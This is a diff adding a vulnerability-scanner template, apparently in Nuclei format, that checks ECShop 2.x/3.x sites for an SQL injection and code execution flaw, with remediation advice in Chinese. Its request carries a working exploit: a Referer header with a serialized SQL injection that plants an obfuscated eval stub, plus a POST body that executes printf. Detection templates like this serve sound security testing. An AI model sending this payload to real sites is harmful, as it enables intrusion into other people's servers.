@@ -1,0 +1,43 @@
+id: Ecshop-Rce
+info:
+  name: ECShop 2.x/3.x SQL注入/任意代码执行漏洞
+  author:
+  - l0ne1y
+  description: |-
+    ECShop 2.x/3.x SQL注入/任意代码执行漏洞
+    ecshop是一款B2C独立网店系统，适合企业及个人快速构建个性化网上商店。系统是基于PHP语言及MYSQL数据库构架开发的跨平台开源程序。
+
+    ecshop存在SQL注入漏洞，攻击者可利用该漏洞获取网站服务器管理员权限。
+  severity: high
+  remediation: |-
+    官方修复建议：
+    厂商尚未提供漏洞修复方案，请关注厂商主页更新：
+    https://www.ecshop.com/
+
+    临时修复方案：
+    1、使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。
+    2、对进入数据库的特殊字符（’”<>&*;等）进行转义处理，或编码转换。
+    3、确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。
+requests:
+- matchers:
+  - type: word
+    part: body
+    words:
+    - '{{randstr}}'
+  - type: word
+    part: body
+    negative: true
+    words:
+    - pp123=printf
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/user.php'
+  method: POST
+  body: action=login&pp123=printf("{{randstr}}");
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:193:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b6576616c09286261736536345f6465636f64650928275a585a686243676b5831425055315262634841784d6a4e644b54733d2729293b2f2f7d787878,10--
+      -";s:2:"id";s:11:"-1' UNION/*";}554fcae493e564ee0dc75bdf2ebf94ca
